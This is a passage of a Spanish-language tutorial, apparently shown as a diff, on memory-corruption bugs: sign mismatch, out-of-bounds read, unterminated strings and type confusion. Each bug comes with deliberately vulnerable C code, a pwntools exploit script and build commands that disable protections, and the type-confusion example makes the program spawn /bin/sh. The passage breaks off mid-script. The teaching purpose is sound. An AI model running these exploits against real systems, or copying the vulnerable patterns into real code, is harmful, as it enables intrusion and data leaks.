+<p><strong>CWE-195 / CWE-196</strong> — Alto</p>
+<h3 id="mecanismo-9">Mecanismo</h3>
+<p>Comparar un <code>int</code> (signed) con un <code>size_t</code> (unsigned) produce comportamiento inesperado.
+Un valor negativo como <code>int</code> se convierte a un número enorme como <code>unsigned</code>.
+Bypassa checks de límite → buffer overflow.</p>
+<h3 id="código-vulnerable-9">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_signmismatch.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_SIZE 256
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">copy_data</span>(<span style="color:#66d9ef">int</span> user_len, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user_data) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[MAX_SIZE];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 user_len es int (puede ser negativo)
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// La comparación int vs size_t promueve user_len a unsigned
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Si user_len = -1 → como unsigned = 0xFFFFFFFF → pasa el check!
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_len <span style="color:#f92672">&gt;</span> MAX_SIZE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Demasiado grande&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// memcpy recibe size_t — si user_len era -1, copia 0xFFFFFFFF bytes 💥
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(buf, user_data, user_len);
+</span></span><span style="display:flex;"><span>    buf[user_len] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> len  <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">copy_data</span>(len, argv[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-3">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_signmismatch.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./vuln_signmismatch&#39;</span>,
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#39;-1&#39;</span>,          <span style="color:#75715e"># user_len = -1: pasa check, copia 0xFFFFFFFF bytes</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">300</span>])   <span style="color:#75715e"># data que nos deja controlar con BOF clásico</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -1 como int con signo pasa el if (user_len &gt; MAX_SIZE)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pero memcpy(-1) = memcpy(0xFFFFFFFFFFFFFFFF) → heap/stack corruption masiva</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="otro-patrón-común">Otro patrón común</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Otro patrón: índice negativo como array access
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> arr[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(input);  <span style="color:#75715e">// puede ser negativo
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Sin chequear idx &gt;= 0:
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>)            <span style="color:#75715e">// pasa si idx = -1
+</span></span></span><span style="display:flex;"><span>    arr[idx] <span style="color:#f92672">=</span> value;    <span style="color:#75715e">// arr[-1] → escribe antes del array
+</span></span></span></code></pre></div><h3 id="compilar-3">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_signmismatch vuln_signmismatch.c -fno-stack-protector -no-pie
+</span></span><span style="display:flex;"><span>./vuln_signmismatch -1 <span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*300)&#34;</span><span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="11-out-of-bounds-read-oob-read">11. Out-of-Bounds Read (OOB Read)</h2>
+<p><strong>CWE-125</strong> — Medio/Alto</p>
+<h3 id="mecanismo-10">Mecanismo</h3>
+<p>Se lee más allá del final de un buffer. No corrompe memoria, pero puede filtrar:
+datos sensibles del stack (canaries, punteros, contraseñas),
+direcciones que permiten bypassear ASLR,
+información de sesión u otros objetos adyacentes.</p>
+<h3 id="código-vulnerable-10">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_oobread.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// El bug de Heartbleed (CVE-2014-0160) era esencialmente esto:
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">send_data</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>payload, <span style="color:#66d9ef">int</span> payload_len, <span style="color:#66d9ef">int</span> claimed_len) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> response[<span style="color:#ae81ff">1024</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 claimed_len puede ser mayor que payload_len
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copiamos más de lo que el payload contiene → leak de memoria adyacente
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(response, payload, claimed_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// &#34;Enviamos&#34; la respuesta (puede contener datos de otros clientes)
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Respuesta (%d bytes): &#34;</span>, claimed_len);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> claimed_len; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)response[i]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> claimed_len;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> secret[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CLAVE_PRIVADA_SUPERSECRETA&#34;</span>;  <span style="color:#75715e">// en stack, adyacente
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ping&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  real_len  <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(payload);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Atacante envía claimed_len = 500 pero payload real es 4 bytes
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send_data</span>(payload, real_len, <span style="color:#ae81ff">500</span>);   <span style="color:#75715e">// 💥 leak de 496 bytes de stack
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--aslr-bypass-via-oob-read">Exploit — ASLR bypass via OOB read</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_oobread.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El OOB read nos da:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Dirección de la libc → bypass ASLR</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Stack canary → bypass stack protector</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Datos sensibles → info disclosure</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_oobread&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>output <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Parsear los bytes heakeados y buscar patrones:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Punteros de 64 bits suelen tener forma 0x00007f...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Canary suele terminar en \x00</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leaked_bytes <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(output<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>:]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(leaked_bytes)<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>    val <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(leaked_bytes[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], <span style="color:#e6db74">&#39;little&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0x00007f0000000000</span> <span style="color:#f92672">&lt;</span> val <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x00007fffffffffff</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Posible puntero de libc/stack en offset </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>hex(val)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h3 id="compilar-4">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_oobread vuln_oobread.c
+</span></span><span style="display:flex;"><span>./vuln_oobread
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Los bytes en hex más allá de &#34;ping&#34; son leaks del stack</span>
+</span></span></code></pre></div><hr>
+<h2 id="12-improper-string-termination">12. Improper String Termination</h2>
+<p><strong>CWE-170</strong> — Medio</p>
+<h3 id="mecanismo-11">Mecanismo</h3>
+<p><code>strncpy</code> no garantiza terminador nulo si <code>src</code> es más largo que <code>n</code>.
+El string queda sin terminar → funciones posteriores leen hasta el próximo <code>\0</code> en memoria.
+Puede filtrar datos o causar OOB read en funciones que esperan strings terminados.</p>
+<h3 id="código-vulnerable-11">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_noterm.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">login</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>username, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> stored_pass[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;s3cr3t&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> user_buf[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// strncpy: si username &gt;= 8 chars, NO agrega \0
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(user_buf, username, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// user_buf no tiene \0 → strcmp lee hasta el próximo \0 en stack
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// que podría ser el inicio de stored_pass!
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(user_buf, stored_pass) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;¡Login exitoso!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Login fallido&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">login</span>(argv[<span style="color:#ae81ff">1</span>], argv[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--leer-datos-adyacentes-del-stack">Exploit — leer datos adyacentes del stack</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_noterm.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Si user_buf[8] no tiene \0, strcmp sigue leyendo el stack</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El stack tiene: user_buf[8] | stored_pass[]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Si llenamos user_buf con exactamente 8 bytes, el strcmp compara:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   user_buf + (bytes del stack hasta el próximo \0)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># vs</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   stored_pass = &#34;s3cr3t&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Podemos hacer que coincida si el byte siguiente en stack es el inicio de stored_pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># user_buf[8] sin \0, seguido de lo que esté en stack</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El strcmp va a comparar nuestro input + basura vs stored_pass</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En la práctica: probar inputs de exactamente 8 bytes para ver el comportamiento</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>    candidate <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> bytes([c])  <span style="color:#75715e"># 8 bytes, sin \0</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./vuln_noterm&#39;</span>, candidate<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;latin-1&#39;</span>), <span style="color:#e6db74">&#39;x&#39;</span>])
+</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;exitoso&#39;</span> <span style="color:#f92672">in</span> out:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Byte mágico: </span><span style="color:#e6db74">{</span>hex(c)<span style="color:#e6db74">}</span><span style="color:#e6db74"> → </span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><h3 id="compilar-5">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_noterm vuln_noterm.c -fno-stack-protector
+</span></span><span style="display:flex;"><span>./vuln_noterm <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span> <span style="color:#e6db74">&#34;cualquier&#34;</span>   <span style="color:#75715e"># 8 As sin \0</span>
+</span></span></code></pre></div><hr>
+<h2 id="13-type-confusion">13. Type Confusion</h2>
+<p><strong>CWE-843</strong> — Alto</p>
+<h3 id="mecanismo-12">Mecanismo</h3>
+<p>Un puntero de un tipo se usa como si fuera de otro tipo.
+En C se logra con casts incorrectos o uniones mal usadas.
+El atacante puede construir un objeto de un tipo que, interpretado como otro, tenga valores de campo favorables.</p>
+<h3 id="código-vulnerable-12">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_typeconf.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  type;     <span style="color:#75715e">// 0 = user input, 1 = system command
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">56</span>];
+</span></span><span style="display:flex;"><span>} Message;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  type;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  privilege_level;   <span style="color:#75715e">// 0=user, 9=root
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cmd[<span style="color:#ae81ff">52</span>];
+</span></span><span style="display:flex;"><span>} Command;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">process</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>raw, <span style="color:#66d9ef">int</span> size) {
+</span></span><span style="display:flex;"><span>    Message <span style="color:#f92672">*</span>m <span style="color:#f92672">=</span> (Message <span style="color:#f92672">*</span>)raw;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Mensaje de usuario: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m<span style="color:#f92672">-&gt;</span>data);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 💥 cast a Command — asume que raw ES un Command
+</span></span></span><span style="display:flex;"><span>        Command <span style="color:#f92672">*</span>c <span style="color:#f92672">=</span> (Command <span style="color:#f92672">*</span>)raw;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (c<span style="color:#f92672">-&gt;</span>privilege_level <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Ejecutando: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, c<span style="color:#f92672">-&gt;</span>cmd);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">system</span>(c<span style="color:#f92672">-&gt;</span>cmd);    <span style="color:#75715e">// executa comando con privilegios
+</span></span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Usuario malicioso construye un Message que parece un Command:
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> raw[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(raw, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// type=1 → process lo tratará como Command
+</span></span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)raw <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// privilege_level = 9 (offset 4)
+</span></span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(raw <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// cmd = &#34;/bin/sh&#34; (offset 8)
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(raw <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">process</span>(raw, <span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--construir-objeto-falso">Exploit — construir objeto falso</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_typeconf.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># type = 1 (offset 0, int)</span>
+</span></span><span style="display:flex;"><span>struct<span style="color:#f92672">.</span>pack_into(<span style="color:#e6db74">&#39;&lt;i&#39;</span>, raw, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># privilege_level = 9 (offset 4, int)</span>
